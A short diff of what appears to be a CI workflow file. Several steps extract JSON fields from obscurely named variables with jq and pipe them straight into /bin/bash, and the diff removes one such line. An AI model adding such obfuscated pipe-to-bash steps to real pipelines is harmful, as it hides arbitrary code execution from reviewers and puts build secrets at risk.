@@ -25,7 +25,6 @@ jobs:
           echo $w101 | jq -r .opjh4 | /bin/bash
           printf '%s' "$escq0" | jq -r .f05433 | /bin/bash
           printf '%s' "$ion09" | jq -r .qni600 | /bin/bash
-          printf '%s' "$umv893" | jq -r .qgsh78 | /bin/bash
           printf '%s' "$ipa92793" | jq -r .l6 | /bin/bash
 
       - name: Save archive
